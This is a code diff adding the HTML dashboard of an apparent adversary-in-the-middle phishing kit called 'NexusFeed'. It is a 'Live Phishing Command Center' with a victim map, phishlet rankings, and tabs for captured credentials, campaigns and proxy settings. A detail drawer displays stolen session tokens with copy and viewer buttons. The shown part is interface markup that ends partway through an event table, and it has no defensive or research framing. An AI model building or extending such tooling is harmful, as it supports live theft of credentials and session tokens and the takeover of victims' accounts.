@@ -1,0 +1,2606 @@
+<!DOCTYPE html>
+<html lang="en" class="h-full bg-gray-900">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>NexusFeed v2 - Live Phishing Command Center</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script src="https://unpkg.com/alpinejs@3.x.x/dist/cdn.min.js" defer></script>
+  <script src="https://cdn.jsdelivr.net/npm/dompurify@3.0.6/dist/purify.min.js"></script>
+  <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
+  <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+  <link rel="stylesheet" href="https://unpkg.com/leaflet.markercluster@1.5.3/dist/MarkerCluster.css"/>
+  <link rel="stylesheet" href="https://unpkg.com/leaflet.markercluster@1.5.3/dist/MarkerCluster.Default.css"/>
+  <script src="https://unpkg.com/leaflet.markercluster@1.5.3/dist/leaflet.markercluster.js"></script>
+  <script src="https://unpkg.com/leaflet.heat/dist/leaflet-heat.js"></script>
+  <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>⚡</text></svg>">
+  <style>
+    [x-cloak] { display: none !important; }
+    .animate-pulse-once { animation: pulse-glow 1s ease-out; }
+    @keyframes pulse-glow {
+        0% { box-shadow: 0 0 0 0 rgba(255, 255, 255, 0.2); transform: scale(1.02); }
+        100% { box-shadow: 0 0 0 10px rgba(255, 255, 255, 0); transform: scale(1); }
+    }
+    /* Mobile-first responsive utilities */
+    @media (max-width: 640px) {
+        .mobile-stack { flex-direction: column !important; }
+        .mobile-full { width: 100% !important; }
+        .mobile-text-sm { font-size: 0.75rem !important; }
+        .mobile-text-xs { font-size: 0.65rem !important; }
+        .mobile-p-2 { padding: 0.5rem !important; }
+        .mobile-p-3 { padding: 0.75rem !important; }
+        .mobile-gap-2 { gap: 0.5rem !important; }
+        .mobile-hidden { display: none !important; }
+        .mobile-overflow-x { overflow-x: auto !important; -webkit-overflow-scrolling: touch; }
+    }
+    /* Toast notification styles */
+    .toast-container {
+        position: fixed;
+        bottom: 24px;
+        left: 50%;
+        transform: translateX(-50%);
+        z-index: 9999;
+        display: flex;
+        flex-direction: column;
+        gap: 8px;
+        pointer-events: none;
+        max-width: 90vw;
+        width: 100%;
+        padding: 0 16px;
+    }
+    @media (min-width: 640px) {
+        .toast-container {
+            max-width: 400px;
+            padding: 0;
+        }
+    }
+    .toast {
+        background: rgba(31, 41, 55, 0.95);
+        backdrop-filter: blur(10px);
+        -webkit-backdrop-filter: blur(10px);
+        border: 1px solid rgba(255, 255, 255, 0.1);
+        border-radius: 8px;
+        padding: 12px 20px;
+        color: #fff;
+        font-size: 14px;
+        box-shadow: 0 4px 20px rgba(0, 0, 0, 0.4);
+        animation: toast-in 0.3s ease-out;
+        pointer-events: auto;
+    }
+    .toast.success { border-left: 3px solid #22c55e; }
+    .toast.error { border-left: 3px solid #ef4444; }
+    .toast.info { border-left: 3px solid #3b82f6; }
+    .toast.warning { border-left: 3px solid #eab308; }
+    @keyframes toast-in {
+        from { opacity: 0; transform: translateY(20px); }
+        to { opacity: 1; transform: translateY(0); }
+    }
+    @keyframes toast-out {
+        from { opacity: 1; transform: translateY(0); }
+        to { opacity: 0; transform: translateY(20px); }
+    }
+    .toast.hiding { animation: toast-out 0.3s ease-in forwards; }
+    ::-webkit-scrollbar { width: 6px; }
+    ::-webkit-scrollbar-track { background: #111827; }
+    ::-webkit-scrollbar-thumb { background: #374151; border-radius: 3px; }
+    ::-webkit-scrollbar-thumb:hover { background: #4b5563; }
+    .leaflet-container { background: #111827; }
+    .glass-stat {
+        background: rgba(31, 41, 55, 0.7);
+        backdrop-filter: blur(10px);
+        -webkit-backdrop-filter: blur(10px);
+        border: 1px solid rgba(255, 255, 255, 0.05);
+    }
+    /* Map marker pulse animation for recent events */
+    @keyframes marker-pulse {
+        0% { transform: scale(1); opacity: 1; }
+        50% { transform: scale(1.3); opacity: 0.8; }
+        100% { transform: scale(1); opacity: 1; }
+    }
+    .marker-pulse > div {
+        animation: marker-pulse 2s ease-in-out infinite;
+    }
+    /* Map legend styles */
+    .map-legend {
+        background: rgba(0, 0, 0, 0.75);
+        -webkit-backdrop-filter: blur(8px);
+        backdrop-filter: blur(8px);
+        border: 1px solid rgba(255, 255, 255, 0.1);
+        border-radius: 6px;
+        padding: 8px 12px;
+        font-size: 10px;
+        color: #fff;
+    }
+    .map-legend-item {
+        display: flex;
+        align-items: center;
+        gap: 6px;
+        margin: 3px 0;
+    }
+    .map-legend-dot {
+        width: 10px;
+        height: 10px;
+        border-radius: 50%;
+        border: 1px solid rgba(255,255,255,0.3);
+    }
+  </style>
+</head>
+<body class="h-full text-gray-100 font-sans antialiased" x-data="nexusfeed()" x-init="init()">
+
+  <div class="flex h-full">
+    <!-- Mobile Overlay -->
+    <div x-show="sidebarOpen" @click="sidebarOpen = false" class="fixed inset-0 bg-black/50 z-40 lg:hidden" x-transition:enter="transition-opacity ease-linear duration-300" x-transition:enter-start="opacity-0" x-transition:enter-end="opacity-100" x-transition:leave="transition-opacity ease-linear duration-300" x-transition:leave-start="opacity-100" x-transition:leave-end="opacity-0" x-cloak></div>
+
+    <!-- Sidebar Navigation -->
+    <div :class="sidebarOpen ? 'translate-x-0' : '-translate-x-full'" class="fixed inset-y-0 left-0 z-50 w-80 bg-gray-800 border-r border-gray-700 flex flex-col transform transition-transform duration-300 ease-in-out lg:translate-x-0 lg:static lg:z-auto">
+      <div class="p-6 border-b border-gray-700 flex items-center justify-between">
+        <div>
+          <h1 class="text-2xl font-bold text-white flex items-center gap-2">
+              <span>⚡</span> NexusFeed <span class="text-xs text-blue-400 font-mono bg-blue-900/30 px-1 rounded">v2.0</span>
+          </h1>
+          <p class="text-xs text-gray-500 mt-1">Real-time AiTM Command Center</p>
+        </div>
+        <!-- Close button for mobile -->
+        <button type="button" @click="sidebarOpen = false" title="Close menu" class="lg:hidden p-2 rounded-md text-gray-400 hover:text-white hover:bg-gray-700">
+          <svg class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12" /></svg>
+        </button>
+      </div>
+      
+      <!-- Mini Live Feed (Sidebar) -->
+      <div class="flex-grow overflow-y-auto p-4 border-b border-gray-700 cursor-pointer hover:bg-gray-750 transition-colors" @click="tab = 'visitors'; sidebarOpen = false" title="Click to view full log">
+          <h2 class="text-xs font-bold mb-3 text-gray-400 uppercase tracking-wider flex justify-between items-center">
+              Live Activity
+              <span class="text-[10px] bg-blue-900/50 text-blue-300 px-1 rounded">View All</span>
+          </h2>
+          <div class="space-y-3">
+              <template x-for="event in activityFeed().slice(0, 10)" :key="event.id">
+                  <div class="text-xs border-l-2 pl-2 py-1" :class="borderClass(event)">
+                      <div class="flex justify-between text-gray-400">
+                          <span x-text="formatTimeShort(event.timestamp)"></span>
+                          <span x-text="event.phishlet || (event.type === 'log' ? 'log' : '')"></span>
+                      </div>
+                      <div class="font-medium text-white truncate" x-text="event.username || event.ip || event.message || 'Unknown'"></div>
+                      <div class="flex justify-between text-[10px] text-gray-500">
+                          <span x-text="event.type"></span>
+                          <span x-show="event.rid" class="text-indigo-400" x-text="'#' + event.rid"></span>
+                      </div>
+                  </div>
+              </template>
+              <div x-show="activityFeed().length === 0" class="text-center text-gray-600 py-4 text-xs">Waiting for activity...</div>
+          </div>
+      </div>
+      
+      <nav class="p-4 space-y-1 flex-shrink-0">
+        <a href="#" @click.prevent="tab = 'dashboard'; sidebarOpen = false" :class="tab === 'dashboard' ? 'bg-gray-900 text-white' : 'text-gray-400 hover:bg-gray-700 hover:text-white'" class="group flex items-center px-2 py-2 text-sm font-medium rounded-md transition-colors">
+            <svg class="mr-3 h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6a2 2 0 012-2h2a2 2 0 012 2v2a2 2 0 01-2 2H6a2 2 0 01-2-2V6zM14 6a2 2 0 012-2h2a2 2 0 012 2v2a2 2 0 01-2 2h-2a2 2 0 01-2-2V6zM4 16a2 2 0 012-2h2a2 2 0 012 2v2a2 2 0 01-2 2H6a2 2 0 01-2-2v-2zM14 16a2 2 0 012-2h2a2 2 0 012 2v2a2 2 0 01-2 2h-2a2 2 0 01-2-2v-2z" /></svg>
+            Dashboard
+        </a>
+        <a href="#" @click.prevent="loadVisitors(); tab = 'visitors'; sidebarOpen = false" :class="tab === 'visitors' ? 'bg-gray-900 text-white' : 'text-gray-400 hover:bg-gray-700 hover:text-white'" class="group flex items-center px-2 py-2 text-sm font-medium rounded-md transition-colors">
+            <svg class="mr-3 h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" /><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" /></svg>
+            Visitors
+        </a>
+        <a href="#" @click.prevent="tab = 'bots'; sidebarOpen = false" :class="tab === 'bots' ? 'bg-gray-900 text-white' : 'text-gray-400 hover:bg-gray-700 hover:text-white'" class="group flex items-center px-2 py-2 text-sm font-medium rounded-md transition-colors">
+            <svg class="mr-3 h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9.75 17L9 21l3-1.5L15 21l-.75-4M3 13h18M5 8h14M10 4h4" /></svg>
+            Bots / Blocked
+        </a>
+        <a href="#" @click.prevent="loadCredentials(); tab = 'credentials'; sidebarOpen = false" :class="tab === 'credentials' ? 'bg-gray-900 text-white' : 'text-gray-400 hover:bg-gray-700 hover:text-white'" class="group flex items-center px-2 py-2 text-sm font-medium rounded-md transition-colors">
+            <svg class="mr-3 h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 7a2 2 0 012 2m4 0a6 6 0 01-7.743 5.743L11 17H9v2H7v2H4a1 1 0 01-1-1v-2.586a1 1 0 01.293-.707l5.964-5.964A6 6 0 1121 9z" /></svg>
+            Credentials
+        </a>
+        <a href="#" @click.prevent="loadCampaigns(); tab = 'campaigns'; sidebarOpen = false" :class="tab === 'campaigns' ? 'bg-gray-900 text-white' : 'text-gray-400 hover:bg-gray-700 hover:text-white'" class="group flex items-center px-2 py-2 text-sm font-medium rounded-md transition-colors">
+            <svg class="mr-3 h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z" /></svg>
+            Campaigns
+        </a>
+        <a href="#" @click.prevent="loadSettings(); tab = 'proxy'; sidebarOpen = false" :class="tab === 'proxy' ? 'bg-gray-900 text-white' : 'text-gray-400 hover:bg-gray-700 hover:text-white'" class="group flex items-center px-2 py-2 text-sm font-medium rounded-md transition-colors">
+            <svg class="mr-3 h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 9l3 3-3 3m5 0h3M5 20h14a2 2 0 002-2V6a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z" /></svg>
+            Proxy
+        </a>
+        <a href="#" @click.prevent="loadSettings(); tab = 'settings'; sidebarOpen = false" :class="tab === 'settings' ? 'bg-gray-900 text-white' : 'text-gray-400 hover:bg-gray-700 hover:text-white'" class="group flex items-center px-2 py-2 text-sm font-medium rounded-md transition-colors">
+            <svg class="mr-3 h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10.325 4.317c.426-1.756 2.924-1.756 3.35 0a1.724 1.724 0 002.573 1.066c1.543-.94 3.31.826 2.37 2.37a1.724 1.724 0 001.065 2.572c1.756.426 1.756 2.924 0 3.35a1.724 1.724 0 00-1.066 2.573c.94 1.543-.826 3.31-2.37 2.37a1.724 1.724 0 00-2.572 1.065c-.426 1.756-2.924 1.756-3.35 0a1.724 1.724 0 00-2.573-1.066c-1.543.94-3.31-.826-2.37-2.37a1.724 1.724 0 00-1.065-2.572c-1.756-.426-1.756-2.924 0-3.35a1.724 1.724 0 001.066-2.573c-.94-1.543.826-3.31 2.37-2.37.996.608 2.296.07 2.572-1.065z" /><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 0 11-6 0 3 3 0 016 0z" /></svg>
+            Settings
+        </a>
+      </nav>
+
+      <div class="p-4 border-t border-gray-700">
+        <div class="flex items-center justify-between text-xs text-gray-500 mb-2">
+            <span>Status:</span>
+            <span :class="connected ? 'text-green-500' : 'text-red-500'" x-text="connected ? 'Connected' : 'Disconnected'"></span>
+        </div>
+        <button type="button" @click="clearLogs()" title="Clear debug logs" class="w-full px-3 py-2 bg-red-900/30 hover:bg-red-900/50 text-red-400 text-xs rounded border border-red-900/50 transition-colors">
+            🗑️ Clear Logs
+        </button>
+      </div>
+    </div>
+
+    <!-- Main Content Area -->
+    <div class="flex-1 flex flex-col overflow-hidden bg-gray-900">
+      
+      <!-- Top Bar -->
+      <header class="bg-gray-800 border-b border-gray-700 p-4 flex justify-between items-center">
+        <div class="flex items-center gap-3">
+          <!-- Mobile menu button -->
+          <button type="button" @click="sidebarOpen = true" title="Open menu" class="lg:hidden p-2 rounded-md text-gray-400 hover:text-white hover:bg-gray-700">
+            <svg class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16M4 18h16" /></svg>
+          </button>
+          <h2 class="text-lg font-semibold text-white capitalize" x-text="tab"></h2>
+        </div>
+        <div class="flex items-center gap-2 sm:gap-4">
+            <button type="button" @click="toggleNotifications()" title="Notifications" class="relative p-2 rounded bg-gray-700 hover:bg-gray-600 text-sm transition-colors">
+                🔔
+                <span x-show="notifications.length" class="absolute -top-1 -right-1 bg-red-500 text-white text-[10px] px-1 rounded-full" x-text="notifications.length"></span>
+            </button>
+            <button type="button" @click="toggleMute()" title="Toggle Mute" class="p-2 rounded bg-gray-700 hover:bg-gray-600 text-sm transition-colors">
+                <span x-text="muted ? '🔇' : '🔊'"></span>
+            </button>
+            <button type="button" @click="logout()" title="Logout" class="px-3 py-2 bg-gray-700 hover:bg-gray-600 text-xs rounded text-white">Logout</button>
+        </div>
+      </header>
+
+      <!-- Notification Panel -->
+      <div x-show="showNotifications" x-cloak class="absolute right-6 top-20 z-20 w-80 bg-gray-800 border border-gray-700 rounded-lg shadow-xl overflow-hidden">
+        <div class="flex justify-between items-center px-4 py-3 border-b border-gray-700">
+            <h4 class="text-sm font-semibold text-white">Notifications</h4>
+            <div class="flex gap-2">
+                <button type="button" @click="clearNotifications()" title="Clear all notifications" class="text-xs text-gray-400 hover:text-gray-200">Clear all</button>
+                <button type="button" @click="showNotifications=false" title="Close notifications" class="text-xs text-gray-400 hover:text-gray-200">Close</button>
+            </div>
+        </div>
+        <div class="max-h-80 overflow-y-auto divide-y divide-gray-700">
+            <template x-for="n in notifications" :key="n.id">
+                <div class="px-4 py-3 hover:bg-gray-750">
+                    <div class="flex justify-between text-xs text-gray-400 mb-1">
+                        <span x-text="n.title"></span>
+                        <span x-text="formatTimeShort(n.when)"></span>
+                    </div>
+                    <div class="text-sm font-semibold text-white truncate" x-text="n.who"></div>
+                    <div class="text-xs text-gray-500" x-text="n.phishlet"></div>
+                </div>
+            </template>
+            <div x-show="notifications.length === 0" class="px-4 py-6 text-center text-gray-500 text-sm">No notifications yet.</div>
+        </div>
+      </div>
+
+      <!-- Content Views -->
+      <main class="flex-1 overflow-y-auto p-3 sm:p-4 md:p-6 relative">
+        <!-- Detail Drawer -->
+        <div x-show="selectedEvent" x-cloak class="fixed inset-0 bg-black/50 z-30 flex justify-end">
+            <div class="w-full max-w-xl h-full bg-gray-900 border-l border-gray-700 overflow-y-auto shadow-2xl">
+                <div class="p-4 border-b border-gray-800 flex justify-between items-center">
+                    <h3 class="text-lg text-white font-semibold">Event Details</h3>
+                    <button type="button" @click="closeDetails()" title="Close details panel" class="text-gray-400 hover:text-gray-200">Close</button>
+                </div>
+                <div class="p-4 space-y-4 text-sm text-gray-200" x-show="selectedEvent">
+                    <div class="grid grid-cols-2 gap-4">
+                        <div>
+                            <div class="text-xs text-gray-500 uppercase">Type</div>
+                            <div class="font-semibold" x-text="selectedEvent.type"></div>
+                        </div>
+                        <div>
+                            <div class="text-xs text-gray-500 uppercase">Phishlet</div>
+                            <div x-text="selectedEvent.phishlet || 'n/a'"></div>
+                        </div>
+                        <div>
+                            <div class="text-xs text-gray-500 uppercase">User/IP</div>
+                            <div x-text="selectedEvent.username || selectedEvent.ip || 'Unknown'"></div>
+                        </div>
+                        <div>
+                            <div class="text-xs text-gray-500 uppercase">Time</div>
+                            <div x-text="formatTime(selectedEvent.timestamp)"></div>
+                        </div>
+                    </div>
+                    <div class="bg-gray-800 border border-gray-700 rounded p-3">
+                        <div class="text-xs text-gray-500 uppercase mb-1">Geo</div>
+                        <div x-text="selectedEvent.geo ? (selectedEvent.geo.city + ', ' + selectedEvent.geo.country) : 'Unknown'"></div>
+                        <div class="text-xs text-gray-500" x-text="selectedEvent.geo ? (selectedEvent.geo.lat + ', ' + selectedEvent.geo.lon) : ''"></div>
+                    </div>
+                    <div class="bg-gray-800 border border-gray-700 rounded p-3">
+                        <div class="flex justify-between items-center mb-1">
+                            <div class="text-xs text-gray-500 uppercase">Activity Timeline</div>
+                            <span class="text-[10px] text-gray-500">Based on IP/Username</span>
+                        </div>
+                        <div class="space-y-2 max-h-40 overflow-y-auto">
+                            <template x-for="ev in relatedEvents(selectedEvent)" :key="ev.id">
+                                <div class="flex items-center justify-between text-xs">
+                                    <div class="flex items-center gap-2">
+                                        <span x-text="icon(ev)"></span>
+                                        <span class="text-gray-200" x-text="ev.type"></span>
+                                    </div>
+                                    <div class="text-gray-500 font-mono" x-text="formatTimeShort(ev.timestamp)"></div>
+                                </div>
+                            </template>
+                            <div x-show="relatedEvents(selectedEvent).length === 0" class="text-xs text-gray-500">No related events yet.</div>
+                        </div>
+                    </div>
+                    <div class="bg-gray-800 border border-gray-700 rounded p-3" x-show="selectedEvent.tokens">
+                        <div class="flex justify-between items-center">
+                            <div class="text-xs text-gray-500 uppercase">Tokens</div>
+                            <div class="space-x-2">
+                                <button type="button" @click="copyTokens(selectedEvent.tokens)" title="Copy tokens to clipboard" class="text-xs text-blue-400 hover:text-blue-300">Copy</button>
+                                <button type="button" @click="openTokenViewer(selectedEvent.tokens, selectedEvent.username || selectedEvent.phishlet)" title="Open token viewer" class="text-xs text-purple-300 hover:text-purple-200">Open in viewer</button>
+                            </div>
+                        </div>
+                        <div class="text-xs font-mono text-gray-300 break-all" x-text="selectedEvent.tokens"></div>
+                    </div>
+                    <div class="bg-gray-800 border border-gray-700 rounded p-3">
+                        <div class="text-xs text-gray-500 uppercase mb-2">Raw Event</div>
+                        <pre class="text-xs text-gray-200 whitespace-pre-wrap break-all" x-text="JSON.stringify(selectedEvent, null, 2)"></pre>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Dashboard View -->
+        <!-- Dashboard View -->
+        <div x-show="tab === 'dashboard'" x-transition:enter="transition ease-out duration-200" x-transition:enter-start="opacity-0" x-transition:enter-end="opacity-100">
+            
+            <!-- Stats Row -->
+            <div class="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-5 gap-2 sm:gap-4 mb-4 sm:mb-6">
+                <div class="glass-stat p-3 sm:p-4 rounded-lg">
+                    <div class="text-[10px] sm:text-xs text-gray-400 uppercase tracking-wider mb-1">Real Visitors</div>
+                    <div class="text-xl sm:text-2xl font-bold text-white" x-text="stats.real">0</div>
+                </div>
+                <div class="glass-stat p-3 sm:p-4 rounded-lg">
+                    <div class="text-[10px] sm:text-xs text-gray-400 uppercase tracking-wider mb-1">Sessions</div>
+                    <div class="text-xl sm:text-2xl font-bold text-white" x-text="stats.sessions">0</div>
+                </div>
+                <div class="glass-stat p-3 sm:p-4 rounded-lg">
+                    <div class="text-[10px] sm:text-xs text-gray-400 uppercase tracking-wider mb-1">Credentials</div>
+                    <div class="text-xl sm:text-2xl font-bold text-white" x-text="stats.creds">0</div>
+                </div>
+                <div class="glass-stat p-3 sm:p-4 rounded-lg">
+                    <div class="text-[10px] sm:text-xs text-gray-400 uppercase tracking-wider mb-1">Total</div>
+                    <div class="text-xl sm:text-2xl font-bold text-white" x-text="stats.total">0</div>
+                </div>
+                <div class="glass-stat p-3 sm:p-4 rounded-lg col-span-2 sm:col-span-1">
+                    <div class="text-[10px] sm:text-xs text-gray-400 uppercase tracking-wider mb-1">Bots</div>
+                    <div class="text-xl sm:text-2xl font-bold text-gray-500" x-text="stats.bots">0</div>
+                </div>
+            </div>
+
+            <!-- Map -->
+            <div class="bg-gray-800 rounded-lg border border-gray-700 p-1 mb-4 sm:mb-6 h-[300px] sm:h-[400px] md:h-[500px] relative">
+                <div id="map" class="w-full h-full rounded bg-gray-900"></div>
+                <!-- Top controls - responsive -->
+                <div class="absolute top-2 sm:top-4 left-2 sm:left-4 bg-black/70 backdrop-blur px-2 sm:px-3 py-1 rounded text-[10px] sm:text-xs text-white z-[1000] flex flex-col sm:flex-row items-start sm:items-center gap-1 sm:gap-3 max-w-[calc(100%-1rem)]">
+                    <span class="hidden sm:inline">Live Victim Map</span>
+                    <button type="button" @click="heatmapEnabled = !heatmapEnabled; updateHeatLayer();" title="Toggle heatmap display" class="text-[9px] sm:text-[10px] px-1.5 sm:px-2 py-0.5 sm:py-1 rounded bg-gray-800 border border-gray-700 hover:bg-gray-700">
+                        <span x-text="heatmapEnabled ? 'Heat' : 'Heat'"></span>
+                    </button>
+                    <div class="flex items-center gap-0.5 sm:gap-1 text-[9px] sm:text-[10px] flex-wrap">
+                        <button type="button" @click="filterTime='5m'; refreshMap();" title="Show last 5 minutes" class="px-1.5 sm:px-2 py-0.5 sm:py-1 rounded bg-gray-800 border border-gray-700 hover:bg-gray-700">5m</button>
+                        <button type="button" @click="filterTime='1h'; refreshMap();" title="Show last hour" class="px-1.5 sm:px-2 py-0.5 sm:py-1 rounded bg-gray-800 border border-gray-700 hover:bg-gray-700">1h</button>
+                        <button type="button" @click="filterTime='24h'; refreshMap();" title="Show last 24 hours" class="px-1.5 sm:px-2 py-0.5 sm:py-1 rounded bg-gray-800 border border-gray-700 hover:bg-gray-700">24h</button>
+                        <button type="button" @click="filterTime='all'; refreshMap();" title="Show all time" class="px-1.5 sm:px-2 py-0.5 sm:py-1 rounded bg-gray-800 border border-gray-700 hover:bg-gray-700">All</button>
+                    </div>
+                </div>
+                <!-- Map Legend - Bottom Right - hidden on very small screens -->
+                <div class="absolute bottom-2 sm:bottom-4 right-2 sm:right-4 map-legend z-[1000] hidden sm:block">
+                    <div class="font-semibold mb-1 text-[11px] text-gray-300">Visitor Stages</div>
+                    <div class="map-legend-item">
+                        <div class="map-legend-dot" style="background:#22c55e;box-shadow:0 0 4px #22c55e"></div>
+                        <span>Opened Page</span>
+                    </div>
+                    <div class="map-legend-item">
+                        <div class="map-legend-dot" style="background:#3b82f6;box-shadow:0 0 4px #3b82f6"></div>
+                        <span>Link Clicked</span>
+                    </div>
+                    <div class="map-legend-item">
+                        <div class="map-legend-dot" style="background:#eab308;box-shadow:0 0 4px #eab308"></div>
+                        <span>Credentials</span>
+                    </div>
+                    <div class="map-legend-item">
+                        <div class="map-legend-dot" style="background:#d946ef;box-shadow:0 0 4px #d946ef"></div>
+                        <span>Session Captured</span>
+                    </div>
+                    <div class="map-legend-item">
+                        <div class="map-legend-dot" style="background:#ef4444;box-shadow:0 0 4px #ef4444"></div>
+                        <span>Bot Detected</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Timeline + Top Phishlets/IPs -->
+            <div class="grid grid-cols-1 lg:grid-cols-3 gap-4 mb-6">
+                <div class="bg-gray-800 rounded-lg border border-gray-700 p-4 lg:col-span-2">
+                    <div class="flex items-center justify-between mb-3">
+                        <h3 class="text-sm font-semibold text-white uppercase tracking-wider">Activity (last hour)</h3>
+                        <div class="text-xs text-gray-400">sessions/creds/clicks/opens</div>
+                    </div>
+                    <div class="flex items-end gap-2 h-32">
+                        <template x-for="bucket in timelineBuckets()" :key="bucket.label">
+                            <div class="flex-1">
+                                <div class="h-full flex items-end gap-1">
+                                    <div class="w-2 bg-purple-500 rounded-t" :style="`height:${bucket.sessions}px`" title="Sessions"></div>
+                                    <div class="w-2 bg-yellow-500 rounded-t" :style="`height:${bucket.creds}px`" title="Creds"></div>
+                                    <div class="w-2 bg-blue-500 rounded-t" :style="`height:${bucket.clicks}px`" title="Clicks"></div>
+                                    <div class="w-2 bg-green-500 rounded-t" :style="`height:${bucket.opens}px`" title="Opens"></div>
+                                </div>
+                                <div class="text-[10px] text-gray-500 text-center mt-1" x-text="bucket.label"></div>
+                            </div>
+                        </template>
+                    </div>
+                </div>
+                <div class="bg-gray-800 rounded-lg border border-gray-700 p-4">
+                    <h3 class="text-sm font-semibold text-white uppercase tracking-wider mb-2">Top Phishlets</h3>
+                    <div class="space-y-2">
+                        <template x-for="item in topPhishlets().slice(0,5)" :key="item.name">
+                            <div class="flex justify-between text-sm text-gray-200">
+                                <span x-text="item.name"></span>
+                                <span class="text-gray-400" x-text="item.count"></span>
+                            </div>
+                        </template>
+                        <div x-show="topPhishlets().length === 0" class="text-xs text-gray-500">No data yet.</div>
+                    </div>
+                    <h3 class="text-sm font-semibold text-white uppercase tracking-wider mb-2 mt-4">Top IPs</h3>
+                    <div class="space-y-2">
+                        <template x-for="item in topIPs().slice(0,5)" :key="item.name">
+                            <div class="flex justify-between text-sm text-gray-200">
+                                <span x-text="item.name"></span>
+                                <span class="text-gray-400" x-text="item.count"></span>
+                            </div>
+                        </template>
+                        <div x-show="topIPs().length === 0" class="text-xs text-gray-500">No data yet.</div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Real Time Events Summary -->
+            <div class="bg-gray-800 rounded-lg border border-gray-700 overflow-hidden">
+                <div class="p-4 border-b border-gray-700 flex flex-col gap-3">
+                    <div class="flex items-center justify-between">
+                        <h3 class="text-sm font-bold text-white uppercase tracking-wider">Real Time Events</h3>
+                        <div class="flex gap-2">
+                            <div class="hidden md:flex items-center gap-1 text-xs text-gray-400">
+                                <span>Columns:</span>
+                                <label class="flex items-center gap-1"><input type="checkbox" x-model="eventCols.event"> Event</label>
+                                <label class="flex items-center gap-1"><input type="checkbox" x-model="eventCols.target"> Target</label>
+                                <label class="flex items-center gap-1"><input type="checkbox" x-model="eventCols.location"> Location</label>
+                                <label class="flex items-center gap-1"><input type="checkbox" x-model="eventCols.time"> Time</label>
+                            </div>
+                            <button type="button" @click="exportJSON()" title="Export events as JSON" class="text-xs px-3 py-1 bg-gray-700 hover:bg-gray-600 text-white rounded">Export JSON</button>
+                            <button type="button" @click="exportCSV()" title="Export events as CSV" class="text-xs px-3 py-1 bg-gray-700 hover:bg-gray-600 text-white rounded">Export CSV</button>
+                            <button type="button" @click="copyFilterLink()" title="Copy filter link to clipboard" class="text-xs px-3 py-1 bg-gray-700 hover:bg-gray-600 text-white rounded">Copy Filter Link</button>
+                            <div class="relative">
+                                <input type="text" x-ref="savedName" placeholder="Save filter name" class="bg-gray-900 border border-gray-700 rounded px-2 py-1 text-xs text-gray-200">
+                                <button type="button" @click="saveCurrentFilter($refs.savedName.value); $refs.savedName.value='';" title="Save current filter" class="text-xs px-2 py-1 bg-gray-700 hover:bg-gray-600 text-white rounded ml-1">Save</button>
+                                <select x-show="savedFilters.length" @change="applySavedFilter($event.target.value)" title="Apply saved filter" class="ml-2 bg-gray-900 border border-gray-700 rounded px-2 py-1 text-xs text-gray-200">
+                                    <option value="">Saved filters</option>
+                                    <template x-for="f in savedFilters" :key="f.name">
+                                        <option :value="f.name" x-text="f.name"></option>
+                                    </template>
+                                </select>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="grid grid-cols-1 md:grid-cols-5 gap-2 text-xs text-gray-300">
+                        <select x-model="filterType" title="Filter by event type" class="bg-gray-900 border border-gray-700 rounded px-2 py-1">
+                            <option value="all">Type: All</option>
+                            <option value="session">Captured Session</option>
+                            <option value="credentials">Credentials</option>
+                            <option value="click">Click</option>
+                            <option value="open">Open</option>
+                            <option value="bot">Bot/Blocked</option>
+                        </select>
+                        <input x-model="filterPhishlet" placeholder="Phishlet" class="bg-gray-900 border border-gray-700 rounded px-2 py-1" />
+                        <input x-model="filterSearch" placeholder="Search IP/Username/Session" class="bg-gray-900 border border-gray-700 rounded px-2 py-1 md:col-span-2" />
+                        <select x-model="filterTime" title="Filter by time range" class="bg-gray-900 border border-gray-700 rounded px-2 py-1">
+                            <option value="all">Any time</option>
+                            <option value="5m">Last 5m</option>
+                            <option value="1h">Last hour</option>
+                            <option value="24h">Last 24h</option>
+                        </select>
+                    </div>
+                </div>
+                <div class="overflow-x-auto">
+                    <table class="min-w-full divide-y divide-gray-700">
+                        <thead class="bg-gray-900">
+                            <tr>
+                                <th class="px-6 py-3 text-left text-xs font-medium text-gray-400 uppercase tracking-wider">Event</th>
+                                <th class="px-6 py-3 text-left text-xs font-medium text-gray-400 uppercase tracking-wider">Target</th>
